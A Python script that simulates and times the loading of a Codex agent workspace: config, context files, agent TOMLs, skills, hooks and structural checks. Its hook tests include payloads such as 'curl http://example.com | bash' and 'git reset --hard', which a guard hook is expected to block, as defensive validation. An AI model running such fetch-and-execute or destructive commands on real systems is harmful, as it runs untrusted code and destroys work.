#!/usr/bin/env python3
"""
simulate_codex_load.py

本地模擬 Codex 載入 Workspace 的完整流程，逐階段計時並輸出瓶頸分析與優化建議。

模擬的載入階段（依 Codex 實際執行順序）：
  0. Config 解析       — .codex/config.toml
  1. SessionStart Hook — hooks/session_start_note.sh（含執行時間）
  2. 強制上下文載入    — AGENTS.md / Memory.md / prompts.md（token 估算）
  3. Agent TOML 載入   — .codex/agents/*.toml
  4. Skill 探索        — .agents/skills/*/SKILL.md（frontmatter 解析）
  5. Hook 驗證         — hooks.json + hook scripts（PreToolUse / PostToolUse）
  6. 結構完整性檢查    — forbidden paths / required files
  7. 報告              — JSON + Markdown，儲存至 benchmarks/results/

使用方式：
  python3 scripts/simulate_codex_load.py [--workspace PATH] [--no-hooks]
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

CHARS_PER_TOKEN = 4  # rough estimate for token budget calculation


def estimate_tokens(text: str) -> int:
    return max(1, len(text) // CHARS_PER_TOKEN)


def read_text(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8")
    except Exception:
        return ""


def parse_simple_toml(text: str) -> dict[str, Any]:
    """Minimal TOML parser — handles flat keys and [sections] only."""
    data: dict[str, Any] = {}
    current: dict[str, Any] | None = None
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        m = re.match(r"^\[([^\]]+)\]$", line)
        if m:
            path = m.group(1).split(".")
            current = data
            for part in path:
                if not isinstance(current.get(part), dict):
                    current[part] = {}
                current = current[part]
            continue
        m = re.match(r'^([A-Za-z0-9_]+)\s*=\s*(.+)$', line)
        if m:
            target = current if current is not None else data
            target[m.group(1)] = m.group(2).strip().strip('"')
    return data


def parse_skill_frontmatter(text: str) -> dict[str, str]:
    """Extract YAML-ish frontmatter between --- delimiters."""
    if not text.startswith("---"):
        return {}
    end = text.find("\n---", 3)
    if end == -1:
        return {}
    fm = text[3:end]
    result: dict[str, str] = {}
    for line in fm.splitlines():
        m = re.match(r"^(\w[\w-]*):\s*(.+)$", line.strip())
        if m:
            result[m.group(1)] = m.group(2).strip()
    return result


# ---------------------------------------------------------------------------
# Result structures
# ---------------------------------------------------------------------------

@dataclass
class PhaseResult:
    name: str
    duration_ms: float
    status: str  # "ok" | "warn" | "error"
    details: list[str] = field(default_factory=list)
    metrics: dict[str, Any] = field(default_factory=dict)
    issues: list[str] = field(default_factory=list)
    suggestions: list[str] = field(default_factory=list)


@dataclass
class LoadSimReport:
    generated_at: str
    workspace: str
    total_duration_ms: float
    overall_status: str  # "pass" | "warn" | "fail"
    phases: list[PhaseResult] = field(default_factory=list)
    summary_issues: list[str] = field(default_factory=list)
    summary_suggestions: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Phase 0 — Config
# ---------------------------------------------------------------------------

def phase_config(root: Path) -> PhaseResult:
    t0 = time.perf_counter()
    issues: list[str] = []
    details: list[str] = []
    metrics: dict[str, Any] = {}

    config_path = root / ".codex" / "config.toml"
    if not config_path.exists():
        return PhaseResult(
            name="config",
            duration_ms=(time.perf_counter() - t0) * 1000,
            status="error",
            issues=["Missing .codex/config.toml"],
        )

    text = read_text(config_path)
    try:
        config = parse_simple_toml(text)
    except Exception as e:
        return PhaseResult(
            name="config",
            duration_ms=(time.perf_counter() - t0) * 1000,
            status="error",
            issues=[f"TOML parse error: {e}"],
        )

    metrics["config_bytes"] = len(text.encode())
    metrics["model"] = config.get("model", "(unset)")
    metrics["reasoning_effort"] = config.get("model_reasoning_effort", "(unset)")
    metrics["approval_policy"] = config.get("approval_policy", "(unset)")
    metrics["sandbox_mode"] = config.get("sandbox_mode", "(unset)")
    metrics["max_threads"] = config.get("agents", {}).get("max_threads", "(unset)")

    for required in ["model", "model_reasoning_effort", "approval_policy", "sandbox_mode"]:
        if required not in config:
            issues.append(f"Missing top-level key: {required}")

    features = config.get("features", {})
    metrics["codex_hooks_enabled"] = features.get("codex_hooks", "false")
    metrics["multi_agent_enabled"] = features.get("multi_agent", "false")

    details.append(f"model={metrics['model']}  effort={metrics['reasoning_effort']}")
    details.append(f"approval={metrics['approval_policy']}  sandbox={metrics['sandbox_mode']}")

    return PhaseResult(
        name="config",
        duration_ms=(time.perf_counter() - t0) * 1000,
        status="error" if issues else "ok",
        details=details,
        metrics=metrics,
        issues=issues,
    )


# ---------------------------------------------------------------------------
# Phase 1 — SessionStart Hook
# ---------------------------------------------------------------------------

def phase_session_start_hook(root: Path, run_hooks: bool) -> PhaseResult:
    t0 = time.perf_counter()
    issues: list[str] = []
    details: list[str] = []
    metrics: dict[str, Any] = {}
    suggestions: list[str] = []

    hook_script = root / ".codex" / "hooks" / "session_start_note.sh"
    if not hook_script.exists():
        return PhaseResult(
            name="session_start_hook",
            duration_ms=(time.perf_counter() - t0) * 1000,
            status="warn",
            issues=["session_start_note.sh not found — SessionStart hook will be skipped"],
        )

    if not os.access(hook_script, os.X_OK):
        issues.append("session_start_note.sh is not executable")

    output_json = ""
    if run_hooks:
        try:
            proc = subprocess.run(
                ["bash", str(hook_script)],
                cwd=root,
                capture_output=True,
                text=True,
                timeout=10,
            )
            output_json = proc.stdout.strip()
            metrics["hook_exit_code"] = proc.returncode
            if proc.returncode != 0:
                issues.append(f"session_start_note.sh exited with code {proc.returncode}")
                if proc.stderr:
                    issues.append(f"stderr: {proc.stderr.strip()[:200]}")
        except subprocess.TimeoutExpired:
            issues.append("session_start_note.sh timed out (>10s)")
    else:
        output_json = read_text(hook_script)  # approximate: read only

    # Analyse hook output size (context injected into every session)
    try:
        parsed = json.loads(output_json) if output_json.startswith("{") else {}
        hook_out = parsed.get("hookSpecificOutput", {})
        context = hook_out.get("additionalContext", "")
        context_bytes = len(context.encode())
        context_tokens = estimate_tokens(context)
        metrics["injected_bytes"] = context_bytes
        metrics["injected_tokens"] = context_tokens
        details.append(f"Hook injects {context_bytes}B / ~{context_tokens} tokens into every session")

        if context_tokens > 400:
            suggestions.append(
                f"SessionStart hook injects ~{context_tokens} tokens — "
                "consider trimming caveman instructions to reduce per-session overhead"
            )
    except Exception:
        metrics["injected_bytes"] = len(output_json.encode()) if output_json else 0

    duration_ms = (time.perf_counter() - t0) * 1000
    metrics["exec_ms"] = round(duration_ms, 2)

    if duration_ms > 500:
        suggestions.append(
            f"SessionStart hook took {duration_ms:.0f}ms — "
            "ensure hook script has no network calls or heavy computation"
        )

    return PhaseResult(
        name="session_start_hook",
        duration_ms=duration_ms,
        status="error" if issues else "ok",
        details=details,
        metrics=metrics,
        issues=issues,
        suggestions=suggestions,
    )


# ---------------------------------------------------------------------------
# Phase 2 — Mandatory Context Load (AGENTS.md / Memory.md / prompts.md)
# ---------------------------------------------------------------------------

MANDATORY_CONTEXT_FILES = [
    "AGENTS.md",
    "Memory.md",
    "prompts.md",
]

TOKEN_BUDGET_WARN = 5000   # tokens — yellow flag
TOKEN_BUDGET_CRIT = 10000  # tokens — red flag


def phase_context_load(root: Path) -> PhaseResult:
    t0 = time.perf_counter()
    issues: list[str] = []
    details: list[str] = []
    metrics: dict[str, Any] = {}
    suggestions: list[str] = []

    total_bytes = 0
    total_tokens = 0
    file_stats: list[dict[str, Any]] = []

    for filename in MANDATORY_CONTEXT_FILES:
        path = root / filename
        if not path.exists():
            issues.append(f"Mandatory context file missing: {filename}")
            file_stats.append({"file": filename, "exists": False})
            continue
        text = read_text(path)
        b = len(text.encode())
        tok = estimate_tokens(text)
        total_bytes += b
        total_tokens += tok
        file_stats.append({"file": filename, "bytes": b, "tokens": tok, "lines": text.count("\n")})
        details.append(f"{filename}: {b}B / ~{tok} tokens / {text.count(chr(10))} lines")

        if tok > 3000:
            suggestions.append(
                f"{filename} is ~{tok} tokens — Codex loads this every session; "
                "consider splitting into AGENTS.md (rules) + on-demand reference docs"
            )

    metrics["total_bytes"] = total_bytes
    metrics["total_tokens"] = total_tokens
    metrics["files"] = file_stats

    status = "ok"
    if total_tokens > TOKEN_BUDGET_CRIT:
        issues.append(
            f"Total mandatory context is ~{total_tokens} tokens "
            f"(>{TOKEN_BUDGET_CRIT}) — may consume significant context window"
        )
        status = "error"
    elif total_tokens > TOKEN_BUDGET_WARN:
        suggestions.append(
            f"Total mandatory context is ~{total_tokens} tokens "
            f"(>{TOKEN_BUDGET_WARN}) — consider pruning Memory.md or prompts.md"
        )
        status = "warn"

    details.append(f"TOTAL: {total_bytes}B / ~{total_tokens} tokens")

    return PhaseResult(
        name="context_load",
        duration_ms=(time.perf_counter() - t0) * 1000,
        status=status,
        details=details,
        metrics=metrics,
        issues=issues,
        suggestions=suggestions,
    )


# ---------------------------------------------------------------------------
# Phase 3 — Agent TOML Load
# ---------------------------------------------------------------------------

REQUIRED_AGENT_FIELDS = ["name", "description", "developer_instructions", "model"]


def phase_agents(root: Path) -> PhaseResult:
    t0 = time.perf_counter()
    issues: list[str] = []
    details: list[str] = []
    metrics: dict[str, Any] = {}
    suggestions: list[str] = []

    agents_dir = root / ".codex" / "agents"
    if not agents_dir.exists():
        return PhaseResult(
            name="agents",
            duration_ms=(time.perf_counter() - t0) * 1000,
            status="error",
            issues=["Missing .codex/agents/ directory"],
        )

    toml_files = sorted(agents_dir.glob("*.toml"))
    agent_stats: list[dict[str, Any]] = []
    total_bytes = 0

    for tf in toml_files:
        text = read_text(tf)
        b = len(text.encode())
        total_bytes += b
        stat: dict[str, Any] = {"file": tf.name, "bytes": b}
        try:
            data = parse_simple_toml(text)
            missing = [k for k in REQUIRED_AGENT_FIELDS if k not in data]
            stat["missing_fields"] = missing
            stat["model"] = data.get("model", "(unset)")
            if missing:
                issues.append(f"{tf.name} missing required fields: {missing}")
        except Exception as e:
            issues.append(f"{tf.name} parse error: {e}")
            stat["parse_error"] = str(e)
        agent_stats.append(stat)
        details.append(f"{tf.name}: {b}B  model={stat.get('model', '?')}")

    metrics["agent_count"] = len(toml_files)
    metrics["total_bytes"] = total_bytes
    metrics["agents"] = agent_stats

    if len(toml_files) == 0:
        issues.append("No agent TOML files found in .codex/agents/")

    return PhaseResult(
        name="agents",
        duration_ms=(time.perf_counter() - t0) * 1000,
        status="error" if issues else "ok",
        details=details,
        metrics=metrics,
        issues=issues,
        suggestions=suggestions,
    )


# ---------------------------------------------------------------------------
# Phase 4 — Skill Discovery
# ---------------------------------------------------------------------------

SKILL_REQUIRED_FRONTMATTER = ["name", "description"]
SKILL_REQUIRED_SECTIONS = ["Use when", "Do not use when"]


def phase_skills(root: Path) -> PhaseResult:
    t0 = time.perf_counter()
    issues: list[str] = []
    details: list[str] = []
    metrics: dict[str, Any] = {}
    suggestions: list[str] = []

    skills_dir = root / ".agents" / "skills"
    if not skills_dir.exists():
        return PhaseResult(
            name="skills",
            duration_ms=(time.perf_counter() - t0) * 1000,
            status="warn",
            issues=["Missing .agents/skills/ directory"],
        )

    skill_dirs = sorted([d for d in skills_dir.iterdir() if d.is_dir()])
    skill_stats: list[dict[str, Any]] = []
    total_bytes = 0

    for sd in skill_dirs:
        skill_md = sd / "SKILL.md"
        stat: dict[str, Any] = {"slug": sd.name}
        if not skill_md.exists():
            issues.append(f"Skill '{sd.name}' missing SKILL.md")
            stat["missing"] = True
            skill_stats.append(stat)
            continue

        text = read_text(skill_md)
        b = len(text.encode())
        tok = estimate_tokens(text)
        total_bytes += b
        stat.update({"bytes": b, "tokens": tok})

        fm = parse_skill_frontmatter(text)
        stat["frontmatter"] = fm

        # Frontmatter checks
        for key in SKILL_REQUIRED_FRONTMATTER:
            if key not in fm:
                issues.append(f"Skill '{sd.name}' SKILL.md missing frontmatter key: {key}")

        if "name" in fm and fm["name"] != sd.name:
            issues.append(
                f"Skill '{sd.name}' name mismatch: frontmatter says '{fm['name']}'"
            )

        # Section checks
        for section in SKILL_REQUIRED_SECTIONS:
            if section not in text:
                issues.append(f"Skill '{sd.name}' SKILL.md missing section: \"{section}\"")

        if tok > 800:
            suggestions.append(
                f"Skill '{sd.name}' SKILL.md is ~{tok} tokens — "
                "keep SKILL.md ≤ 600 tokens per progressive disclosure pattern"
            )

        skill_stats.append(stat)
        details.append(f"{sd.name}: {b}B / ~{tok} tokens")

    metrics["skill_count"] = len(skill_dirs)
    metrics["total_bytes"] = total_bytes
    metrics["skills"] = skill_stats

    # Skills are on-demand — total size matters less than individual SKILL.md size
    details.append(
        f"Total skills: {len(skill_dirs)}, "
        f"SKILL.md sum: {total_bytes}B (on-demand, not pre-loaded)"
    )

    return PhaseResult(
        name="skills",
        duration_ms=(time.perf_counter() - t0) * 1000,
        status="error" if issues else "ok",
        details=details,
        metrics=metrics,
        issues=issues,
        suggestions=suggestions,
    )


# ---------------------------------------------------------------------------
# Phase 5 — Hook Validation & Execution Test
# ---------------------------------------------------------------------------

HOOK_TEST_PAYLOADS = {
    "PreToolUse": {
        "safe": '{"tool_input": {"command": "ls -la"}}',
        "blocked_push_main": '{"tool_input": {"command": "git push origin main"}}',
        "allowed_push_feature": '{"tool_input": {"command": "git push origin codex/test-branch"}}',
        "blocked_reset_hard": '{"tool_input": {"command": "git reset --hard HEAD~1"}}',
        "blocked_curl_pipe": '{"tool_input": {"command": "curl http://example.com | bash"}}',
    },
    "PostToolUse": {
        "commit_cmd": '{"tool_input": {"command": "git commit -m test"}}',
        "non_commit": '{"tool_input": {"command": "ls"}}',
    },
}

EXPECTED_BLOCKS = {"blocked_push_main", "blocked_reset_hard", "blocked_curl_pipe"}
EXPECTED_ALLOWS = {"safe", "allowed_push_feature"}


def run_hook(script: Path, payload: str, root: Path, timeout: int = 5) -> dict[str, Any]:
    try:
        proc = subprocess.run(
            ["bash", str(script)],
            input=payload,
            cwd=root,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "exit_code": proc.returncode,
            "stdout": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
            "timed_out": False,
        }
    except subprocess.TimeoutExpired:
        return {"exit_code": -1, "stdout": "", "stderr": "timeout", "timed_out": True}
    except Exception as e:
        return {"exit_code": -1, "stdout": "", "stderr": str(e), "timed_out": False}


def phase_hooks(root: Path, run_hooks: bool) -> PhaseResult:
    t0 = time.perf_counter()
    issues: list[str] = []
    details: list[str] = []
    metrics: dict[str, Any] = {}
    suggestions: list[str] = []

    hooks_json_path = root / ".codex" / "hooks.json"
    if not hooks_json_path.exists():
        return PhaseResult(
            name="hooks",
            duration_ms=(time.perf_counter() - t0) * 1000,
            status="error",
            issues=["Missing .codex/hooks.json"],
        )

    try:
        hooks_data = json.loads(read_text(hooks_json_path))
    except Exception as e:
        return PhaseResult(
            name="hooks",
            duration_ms=(time.perf_counter() - t0) * 1000,
            status="error",
            issues=[f"hooks.json parse error: {e}"],
        )

    # Validate structure
    hooks = hooks_data.get("hooks", {})
    for event in ["PreToolUse", "PostToolUse"]:
        groups = hooks.get(event, [])
        if not groups:
            issues.append(f"hooks.json missing event: {event}")
            continue
        for group in groups:
            matcher = group.get("matcher")
            if matcher != "Bash":
                issues.append(
                    f"{event} matcher is '{matcher}' — must be 'Bash' for current Codex runtime"
                )

    # Check SessionStart matcher
    ss_groups = hooks.get("SessionStart", [])
    if ss_groups:
        for group in ss_groups:
            matcher = group.get("matcher", "")
            if matcher not in ("startup", "resume", "startup|resume"):
                suggestions.append(
                    f"SessionStart matcher '{matcher}' may not match; expected 'startup|resume'"
                )
    else:
        suggestions.append("No SessionStart hook defined — missing per-session context injection")

    # Script executability
    script_map = {
        "pre_tool_use_guard.sh": root / ".codex" / "hooks" / "pre_tool_use_guard.sh",
        "post_tool_use_note.sh": root / ".codex" / "hooks" / "post_tool_use_note.sh",
        "session_start_note.sh": root / ".codex" / "hooks" / "session_start_note.sh",
    }
    for name, path in script_map.items():
        if not path.exists():
            issues.append(f"Hook script missing: {name}")
        elif not os.access(path, os.X_OK):
            issues.append(f"Hook script not executable: {name}")

    metrics["hook_events"] = list(hooks.keys())

    # Live execution tests
    if run_hooks:
        pre_script = script_map["pre_tool_use_guard.sh"]
        test_results: dict[str, Any] = {}
        for label, payload in HOOK_TEST_PAYLOADS["PreToolUse"].items():
            ts = time.perf_counter()
            result = run_hook(pre_script, payload, root)
            elapsed = (time.perf_counter() - ts) * 1000
            output = result["stdout"]
            is_blocked = '"permissionDecision":"deny"' in output or '"permissionDecision": "deny"' in output
            test_results[label] = {
                "exit_code": result["exit_code"],
                "blocked": is_blocked,
                "exec_ms": round(elapsed, 2),
                "timed_out": result["timed_out"],
            }
            # Correctness check
            if label in EXPECTED_BLOCKS and not is_blocked:
                issues.append(f"PreToolUse hook FAILED to block '{label}' — security gap!")
            if label in EXPECTED_ALLOWS and is_blocked:
                issues.append(f"PreToolUse hook incorrectly blocked '{label}' — false positive")

            details.append(
                f"pre_tool_use [{label}]: blocked={is_blocked}  {elapsed:.1f}ms"
            )

        metrics["pre_tool_use_tests"] = test_results

        # Latency suggestion
        all_ms = [v["exec_ms"] for v in test_results.values()]
        avg_ms = sum(all_ms) / len(all_ms) if all_ms else 0
        if avg_ms > 100:
            suggestions.append(
                f"pre_tool_use_guard.sh avg latency {avg_ms:.0f}ms — "
                "guard fires on every Bash call; keep it under 50ms"
            )

    return PhaseResult(
        name="hooks",
        duration_ms=(time.perf_counter() - t0) * 1000,
        status="error" if issues else "ok",
        details=details,
        metrics=metrics,
        issues=issues,
        suggestions=suggestions,
    )


# ---------------------------------------------------------------------------
# Phase 6 — Structural Integrity
# ---------------------------------------------------------------------------

FORBIDDEN_PATHS = [
    ".claude",
    "CLAUDE.md",
    "plugins",
    ".agents/plugins",
]

REQUIRED_DOCS = [
    "docs/codex-migration-guide.md",
    "docs/codex-best-practices.md",
    "AGENTS.md",
    "Memory.md",
]

MIGRATION_GUIDE_MARKERS = [
    "developers.openai.com/codex/guides/agents-md",
    "developers.openai.com/codex/learn/best-practices",
    "developers.openai.com/codex/subagents",
    "developers.openai.com/codex/hooks",
    "developers.openai.com/codex/config-reference#configtoml",
]


def _is_gitignored(path: Path, root: Path) -> bool:
    """Return True if path is covered by .gitignore (not tracked by git)."""
    try:
        result = subprocess.run(
            ["git", "check-ignore", "-q", str(path)],
            cwd=root,
            capture_output=True,
            timeout=5,
        )
        return result.returncode == 0
    except Exception:
        return False


def phase_structure(root: Path) -> PhaseResult:
    t0 = time.perf_counter()
    issues: list[str] = []
    details: list[str] = []
    metrics: dict[str, Any] = {}
    suggestions: list[str] = []

    # Forbidden artifacts (skip gitignored paths — e.g. .claude/ managed by Claude Code)
    forbidden_found = []
    for rel in FORBIDDEN_PATHS:
        p = root / rel
        if p.exists() and not _is_gitignored(p, root):
            forbidden_found.append(rel)
            issues.append(f"Forbidden non-Codex artifact present: {rel}")
    metrics["forbidden_found"] = forbidden_found

    # Required docs
    missing_docs = []
    for rel in REQUIRED_DOCS:
        p = root / rel
        if not p.exists():
            missing_docs.append(rel)
            issues.append(f"Required doc missing: {rel}")
    metrics["missing_docs"] = missing_docs

    # Migration guide official source markers
    mg_path = root / "docs" / "codex-migration-guide.md"
    if mg_path.exists():
        mg_text = read_text(mg_path)
        missing_markers = [m for m in MIGRATION_GUIDE_MARKERS if m not in mg_text]
        if missing_markers:
            for m in missing_markers:
                issues.append(f"Migration guide missing official source URL: {m}")
        metrics["migration_guide_bytes"] = len(mg_text.encode())
        metrics["missing_markers"] = missing_markers
        details.append(f"Migration guide: {len(mg_text.encode())}B, markers ok: {len(MIGRATION_GUIDE_MARKERS) - len(missing_markers)}/{len(MIGRATION_GUIDE_MARKERS)}")

    # .gitignore check for sensitive files
    gitignore = root / ".gitignore"
    if gitignore.exists():
        gi_text = read_text(gitignore)
        for sensitive in [".env", ".env.local", "*.key", "*.pem"]:
            if sensitive not in gi_text:
                suggestions.append(f".gitignore may not cover '{sensitive}' — verify sensitive files are excluded")
    else:
        suggestions.append("No .gitignore found")

    details.append(f"Forbidden paths found: {len(forbidden_found)}, Missing docs: {len(missing_docs)}")

    return PhaseResult(
        name="structure",
        duration_ms=(time.perf_counter() - t0) * 1000,
        status="error" if issues else "ok",
        details=details,
        metrics=metrics,
        issues=issues,
        suggestions=suggestions,
    )


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------

STATUS_ICON = {"ok": "PASS", "warn": "WARN", "error": "FAIL"}
STATUS_PRIORITY = {"error": 2, "warn": 1, "ok": 0}


def build_report(phases: list[PhaseResult], root: Path, total_ms: float) -> LoadSimReport:
    all_issues = [i for p in phases for i in p.issues]
    all_suggestions = [s for p in phases for s in p.suggestions]

    worst = max(STATUS_PRIORITY.get(p.status, 0) for p in phases) if phases else 0
    overall = "fail" if worst == 2 else ("warn" if worst == 1 else "pass")

    return LoadSimReport(
        generated_at=datetime.now(timezone.utc).isoformat(),
        workspace=str(root.resolve()),
        total_duration_ms=round(total_ms, 2),
        overall_status=overall,
        phases=phases,
        summary_issues=all_issues,
        summary_suggestions=list(dict.fromkeys(all_suggestions)),  # deduplicate
    )


def render_markdown(report: LoadSimReport) -> str:
    lines = [
        "# Codex Load Simulation Report",
        "",
        f"Generated: `{report.generated_at}`",
        f"Workspace: `{report.workspace}`",
        f"Total load time: **{report.total_duration_ms:.1f}ms**",
        f"Overall status: **{report.overall_status.upper()}**",
        "",
        "## Phase Summary",
        "",
        "| Phase | Status | Duration |",
        "|---|:---:|---:|",
    ]
    for p in report.phases:
        icon = STATUS_ICON.get(p.status, p.status.upper())
        lines.append(f"| {p.name} | {icon} | {p.duration_ms:.1f}ms |")

    lines += ["", "## Phase Details", ""]
    for p in report.phases:
        lines += [f"### {p.name} — {STATUS_ICON.get(p.status, p.status.upper())}", ""]
        if p.details:
            for d in p.details:
                lines.append(f"- {d}")
            lines.append("")
        if p.metrics:
            lines += ["**Metrics:**", "```json", json.dumps(p.metrics, indent=2, ensure_ascii=False), "```", ""]
        if p.issues:
            lines += ["**Issues:**"]
            for i in p.issues:
                lines.append(f"- {i}")
            lines.append("")
        if p.suggestions:
            lines += ["**Suggestions:**"]
            for s in p.suggestions:
                lines.append(f"- {s}")
            lines.append("")

    if report.summary_issues:
        lines += ["## All Issues", ""]
        for i in report.summary_issues:
            lines.append(f"- {i}")
        lines.append("")

    if report.summary_suggestions:
        lines += ["## Optimization Suggestions", ""]
        for s in report.summary_suggestions:
            lines.append(f"- {s}")
        lines.append("")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Local Codex workspace load simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--workspace",
        default=".",
        help="Path to Codex workspace root (default: current directory)",
    )
    parser.add_argument(
        "--no-hooks",
        action="store_true",
        help="Skip live hook execution (structural checks only)",
    )
    parser.add_argument(
        "--output-dir",
        default=None,
        help="Directory to save JSON + Markdown reports (default: benchmarks/results/)",
    )
    args = parser.parse_args()

    root = Path(args.workspace).resolve()
    run_hooks = not args.no_hooks
    output_dir = Path(args.output_dir) if args.output_dir else root / "benchmarks" / "results"

    print(f"Simulating Codex workspace load: {root}")
    print(f"Hook execution: {'enabled' if run_hooks else 'disabled (--no-hooks)'}")
    print()

    sim_t0 = time.perf_counter()

    phases: list[PhaseResult] = []

    phase_fns = [
        ("Phase 0 — Config", lambda: phase_config(root)),
        ("Phase 1 — SessionStart Hook", lambda: phase_session_start_hook(root, run_hooks)),
        ("Phase 2 — Mandatory Context", lambda: phase_context_load(root)),
        ("Phase 3 — Agent TOMLs", lambda: phase_agents(root)),
        ("Phase 4 — Skill Discovery", lambda: phase_skills(root)),
        ("Phase 5 — Hooks Validation", lambda: phase_hooks(root, run_hooks)),
        ("Phase 6 — Structure", lambda: phase_structure(root)),
    ]

    for label, fn in phase_fns:
        print(f"  {label}...", end="", flush=True)
        result = fn()
        phases.append(result)
        icon = STATUS_ICON.get(result.status, result.status.upper())
        print(f" [{icon}] {result.duration_ms:.1f}ms")
        if result.issues:
            for iss in result.issues:
                print(f"    ! {iss}")

    total_ms = (time.perf_counter() - sim_t0) * 1000
    print()

    report = build_report(phases, root, total_ms)

    # Save reports
    output_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    json_path = output_dir / f"codex_load_sim_{ts}.json"
    md_path = output_dir / f"codex_load_sim_{ts}.md"

    # JSON — convert dataclasses to dicts
    def to_dict(obj: Any) -> Any:
        if hasattr(obj, "__dataclass_fields__"):
            return {k: to_dict(v) for k, v in asdict(obj).items()}
        if isinstance(obj, list):
            return [to_dict(x) for x in obj]
        return obj

    json_path.write_text(json.dumps(to_dict(report), indent=2, ensure_ascii=False) + "\n")
    md_path.write_text(render_markdown(report))

    print(f"status        : {report.overall_status.upper()}")
    print(f"total_load_ms : {report.total_duration_ms:.1f}ms")
    print(f"issues        : {len(report.summary_issues)}")
    print(f"suggestions   : {len(report.summary_suggestions)}")
    print(f"report_json   : {json_path}")
    print(f"report_md     : {md_path}")

    if report.summary_suggestions:
        print()
        print("Optimization suggestions:")
        for s in report.summary_suggestions:
            print(f"  * {s}")

    return 0 if report.overall_status == "pass" else 1


if __name__ == "__main__":
    raise SystemExit(main())
